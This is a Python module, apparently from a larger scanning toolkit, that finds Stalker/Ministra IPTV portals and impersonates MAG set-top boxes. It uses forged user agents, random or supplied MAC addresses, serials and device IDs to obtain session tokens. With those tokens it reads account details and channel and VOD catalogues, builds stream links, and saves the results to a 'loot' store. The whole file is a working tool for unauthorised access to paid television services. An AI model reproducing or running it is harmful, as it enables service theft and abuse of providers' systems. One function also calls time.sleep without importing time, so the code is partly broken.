"""Stalker/Ministra-Portal-Erkennung + MAG-Emulator (nur lesend)."""
from __future__ import annotations
import hashlib
import json
import os
import random
import secrets

from .audit import Audit
from .models import Access

OUT = "/var/lib/dw/stalker"
UA = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"


from urllib.parse import urlparse


def _sess(url=None):
    import requests, urllib3
    urllib3.disable_warnings()
    s = requests.Session(); s.verify = False
    h = {"User-Agent": UA, "X-User-Agent": "Model: MAG200; Link: WiFi",
         "Accept-Language": "en,*", "Connection": "Keep-Alive"}
    if url:
        u = urlparse(url)
        h["Host"] = u.hostname or ""
        h["Referer"] = f"{u.scheme}://{u.hostname}/"
    s.headers.update(h)
    return s


def _mac():
    return "00:1A:79:%02X:%02X:%02X" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))


def _serial():
    return "".join(random.choice("0123456789ABCDEF") for _ in range(13))


def detect(t) -> bool:
    if t.port not in (80, 443, 8080, 8081, 81):
        return False
    s = _sess(t.url)
    s.headers["Cookie"] = "mac=" + _mac().replace(":", "%3A")
    for p in ("/c/portal.php?type=stb&action=handshake&prehash=false",
              "/portal.php?type=stb&action=handshake&prehash=false"):
        try:
            r = s.get(t.url + p, timeout=7)
            if r.status_code == 200 and '"token"' in r.text:
                return True
            if r.status_code in (512, 429, 403) and "html" in r.headers.get("content-type", ""):
                return True
        except Exception:
            pass
    try:
        r = s.get(t.url + "/c/", timeout=6)
        if r.status_code == 200 and ("loadRequiredFile" in r.text or "magcore" in r.text
                                     or "ministra" in r.text.lower()):
            return True
    except Exception:
        pass
    return False


def probe(t, audit: Audit):
    base = None
    for p in ("/c/portal.php", "/portal.php"):
        try:
            s = _sess(); mac = _mac(); serial = _serial()
            s.headers["Cookie"] = "mac=" + mac.replace(":", "%3A") + "; stb_lang=en; timezone=Europe/Berlin"
            r = s.get(t.url + p + "?type=stb&action=handshake&prehash=false", timeout=8)
            if r.status_code == 200 and '"token"' in r.text:
                base = (p, r.json().get("js", {}).get("token", ""))
                break
        except Exception:
            continue
    if not base:
        os.makedirs(OUT, exist_ok=True)
        h = hashlib.sha1(t.url.encode()).hexdigest()[:12]
        open(os.path.join(OUT, h + ".json"), "w").write(json.dumps(
            {"ts": __import__("time").time(), "portal": t.url, "mac": "", "locked": True}))
        audit.write("stalker", "portal-locked", t.url)
        return {"locked": True}
    path, token = base
    s.headers["Authorization"] = "Bearer " + token
    info = {"mac": mac, "serial": serial, "portal": t.url + path}
    try:
        prof = s.get(t.url + path + "?type=stb&action=get_profile&hd=1", timeout=8).json()
        js = prof.get("js", {})
        info["model"] = js.get("stb_type") or js.get("model") or "?"
        info["ver"] = js.get("ver") or ""
    except Exception:
        pass
    try:
        acc = s.get(t.url + path + "?type=stb&action=get_account_info", timeout=8).json().get("js", {})
        info["expire"] = acc.get("phone") or acc.get("end_date") or acc.get("tariff_expired_date") or ""
        info["login"] = acc.get("login") or ""
    except Exception:
        pass
    for key, action, field in (("channels", "get_all_channels", "total_items"),
                               ("genres", "get_genres", "total_items"),
                               ("vod", "get_ordered_list&type=vod&sortby=added&p=1", "total_items")):
        try:
            j = s.get(t.url + path + f"?type=stb&action={action}", timeout=10).json().get("js", {})
            info[key] = j.get(field) or len(j.get("data") or [])
            if key == "genres" and j.get("data"):
                info["provider"] = ", ".join(x.get("title", "") for x in j["data"][:8])
        except Exception:
            info[key] = 0
    os.makedirs(OUT, exist_ok=True)
    h = hashlib.sha1(t.url.encode()).hexdigest()[:12]
    open(os.path.join(OUT, h + ".json"), "w").write(json.dumps({"ts": __import__("time").time(), **info}))
    audit.write("stalker", "portal", t.url, mac=mac, channels=info.get("channels"), vod=info.get("vod"))
    try:
        from . import loot
        loot.write(t, Access("stalker", mac, token[:24]), "", False, False,
                   {"stalker": h, "channels": info.get("channels", 0),
                    "vod": info.get("vod", 0), "provider": info.get("provider", "")})
    except Exception:
        pass
    return info


def check_mac(portal, mac, serial="", sn="", sncut="", dev1="", dev2="", expire=""):
    """Portal mit einer konkreten MAC/Serial abfragen."""
    import time
    portal = portal.rstrip("/")
    info = {"ts": time.time(), "portal": portal, "mac": mac, "serial": serial,
            "sn": sn, "sncut": sncut, "dev1": dev1, "dev2": dev2, "expire_in": expire}
    s = _sess(portal)
    ck = f"mac={mac}; stb_lang=en; timezone=Europe/Berlin"
    if dev1:
        ck += f"; device_id={dev1}; device_id2={dev2 or dev1}"
    if sn:
        ck += f"; sn={sn}"
    s.headers["Cookie"] = ck
    token = ""
    rnd = ""
    for p in ("/c/portal.php", "/portal.php", "/stalker_portal/c/portal.php", "/server/load.php"):
        for attempt in range(3):
            try:
                s.headers["Authorization"] = "Bearer "
                r = s.get(portal + p + "?JsHttpRequest=1-xml&type=stb&action=handshake", timeout=12)
            except Exception:
                break
            if r.status_code == 429:
                time.sleep(3 * (attempt + 1)); continue
            if r.status_code == 200 and '"token"' in r.text:
                j = r.json().get("js", {})
                token = j.get("token", ""); rnd = j.get("random", "")
                info["endpoint"] = p
                break
            break
        if token:
            break
    if not token:
        info["status"] = "locked"
        return info
    s.headers["Authorization"] = "Bearer " + token
    s.cookies.set("token", token)
    if rnd:
        s.headers["X-Random"] = rnd; s.headers["Random"] = rnd
    ep = info["endpoint"]
    def _get(action, typ="stb"):
        for i in range(3):
            r = s.get(portal + ep + f"?type={typ}&action=" + action, timeout=12)
            if r.status_code == 429:
                time.sleep(2 * (i + 1)); continue
            try:
                return r.json().get("js", {})
            except Exception:
                return {}
        return {}
    try:
        acc = _get("get_account_info")
        if not acc:
            info["acc_empty"] = True
        info["expire"] = acc.get("end_date") or acc.get("tariff_expired_date") or expire
    except Exception:
        info["expire"] = expire
    try:
        g = _get("get_genres", "itv")
        gd = g if isinstance(g, list) else (g.get("data") or [])
        gd = [x for x in gd if x.get("id") != "*"]
        titles = [x.get("title", "") for x in gd]
        info["genres_list"] = titles
        info["genres"] = len(gd)
        de = [t for t in titles if t.upper().startswith(("DE -", "DE ")) or "deutschland" in t.lower()]
        info["german"] = bool(de)
        info["german_cats"] = len(de)
    except Exception:
        info["provider"] = ""
    try:
        c = _get("get_all_channels&genre=*&p=1", "itv")
        info["channels"] = c.get("total_items") or len(c.get("data") or [])
    except Exception:
        pass
    try:
        j = _get("get_ordered_list&p=1&sortby=added", "vod")
        info["vod"] = j.get("total_items") or len(j.get("data") or [])
    except Exception:
        info["vod"] = 0
    info.setdefault("channels", 0)
    if info.get("acc_empty") and not info.get("genres"):
        info["status"] = "locked"
        return info
    info["status"] = "ok"
    return info


def _auth(portal, mac, sn="", dev1="", dev2=""):
    """Session mit Token; liefert (session, endpoint)."""
    portal = portal.rstrip("/")
    s = _sess(portal)
    ck = f"mac={mac}; stb_lang=en; timezone=Europe/Berlin"
    if dev1:
        ck += f"; device_id={dev1}; device_id2={dev2 or dev1}"
    if sn:
        ck += f"; sn={sn}"
    s.headers["Cookie"] = ck
    token = ""; rnd = ""; ep = ""
    for p in ("/c/portal.php", "/portal.php", "/stalker_portal/c/portal.php"):
        s.headers["Authorization"] = "Bearer "
        try:
            r = s.get(portal + p + "?JsHttpRequest=1-xml&type=stb&action=handshake", timeout=12)
        except Exception:
            continue
        if r.status_code == 429:
            time.sleep(2); continue
        if r.status_code == 200 and '"token"' in r.text:
            j = r.json().get("js", {})
            token = j.get("token", ""); rnd = j.get("random", ""); ep = p
            break
    if not token:
        return None, ""
    s.headers["Authorization"] = "Bearer " + token
    s.cookies.set("token", token)
    if rnd:
        s.headers["X-Random"] = rnd; s.headers["Random"] = rnd
    return s, ep


def bouquets(portal, mac, sn="", dev1="", dev2=""):
    s, ep = _auth(portal, mac, sn, dev1, dev2)
    if not s:
        return None
    try:
        r = s.get(portal.rstrip("/") + ep + "?JsHttpRequest=1-xml&type=itv&action=get_genres", timeout=12)
        j = r.json().get("js") or []
        return [{"id": x.get("id"), "title": x.get("title")} for x in j if isinstance(x, dict) and x.get("id") != "*"]
    except Exception:
        return []


def channels(portal, mac, genre, page=1, sn="", dev1="", dev2=""):
    s, ep = _auth(portal, mac, sn, dev1, dev2)
    if not s:
        return {"total": 0, "items": []}
    try:
        r = s.get(portal.rstrip("/") + ep + f"?JsHttpRequest=1-xml&type=itv&action=get_ordered_list&genre={genre}&p={page}", timeout=15)
        j = r.json().get("js") or {}
        return {"total": j.get("total_items") or 0,
                "items": [{"id": x.get("id"), "name": x.get("name"), "cmd": x.get("cmd"),
                           "tmp": x.get("use_http_tmp_link") or 0,
                           "lb": x.get("use_load_balancing") or 0,
                           "chk": x.get("force_ch_link_check") or 0} for x in (j.get("data") or [])]}
    except Exception:
        return {"total": 0, "items": []}


def stream_url(portal, mac, cmd, sn="", dev1="", dev2="", tmp=1, lb=0, chk=0):
    if not (int(tmp or 0) or int(lb or 0) or int(chk or 0)) and cmd:
        u = cmd
        for pre in ("ffmpeg ", "auto ", "ffrt2 ", "ffrt ", "ff "):
            if u.startswith(pre):
                u = u[len(pre):]
        return u.replace("\\/", "/").replace("%mac%", mac)
    s, ep = _auth(portal, mac, sn, dev1, dev2)
    if not s:
        return None
    from urllib.parse import quote
    try:
        r = s.get(portal.rstrip("/") + ep + "?JsHttpRequest=1-xml&type=itv&action=create_link&cmd="
                  + quote(cmd, safe="") + "&series=0&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0",
                  timeout=15)
        c = (r.json().get("js") or {}).get("cmd") or ""
        for pre in ("ffmpeg ", "auto ", "ffrt2 ", "ffrt ", "ff "):
            if c.startswith(pre):
                c = c[len(pre):]
        return c or None
    except Exception:
        return None
